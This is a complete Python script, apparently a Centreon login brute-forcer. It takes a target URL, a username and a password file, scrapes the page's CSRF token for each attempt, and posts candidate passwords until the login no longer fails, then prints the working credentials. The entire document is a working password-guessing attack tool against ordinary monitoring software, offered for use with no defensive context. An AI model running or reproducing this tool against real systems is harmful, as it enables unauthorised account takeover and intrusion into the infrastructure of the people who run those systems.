#!/usr/bin/python

import requests
import sys
import warnings
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) != 4:
    print(len(sys.argv))
    print("[~] Usage : ./centreon-login-bruteforcer.py url username password_file")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password_file = sys.argv[3]

f = open(password_file, 'r')
password = f.readline()
while password:
    request = requests.session()
    password = password.strip()
    if '#' in password in password:
        password = f.readline()
        continue
    page = request.get(url+"/index.php")
    html_content = page.text
    soup = BeautifulSoup(html_content, features="lxml")
    token = soup.findAll('input')[3].get("value")

    login_info = {
        "useralias": username,
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }
    login_request = request.post(url+"/index.php", login_info)
    if "Your credentials are incorrect." not in login_request.text:
        print("[+] Logged In")
        print("[+] Username: " + username)
        print("[+] Password: " + password)
        password = False;
    else:
        password = f.readline()

f.close()
